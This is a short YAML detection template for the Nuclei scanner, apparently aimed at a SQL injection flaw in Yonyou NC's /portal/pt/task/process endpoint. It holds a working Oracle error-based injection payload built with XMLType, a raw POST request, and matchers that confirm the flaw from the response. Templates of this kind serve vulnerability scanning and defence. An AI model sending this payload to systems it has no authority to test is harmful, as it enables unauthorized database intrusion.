id: poc-yaml-yongyou-nc-process-sqli
info:
  name: 用友NC process SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  payload: "{{url_encode(' AND 7194=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7194=7194) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)-- dJyN')}}"

http:
  - raw:
      - |
        POST /portal/pt/task/process?pageId=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=1&oracle=1&pluginid=1{{payload}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "qqbbq1qxxqq"
          - "SYS.XMLTYPE"
          - "nc.bs.dao.DAOException"
        part: body
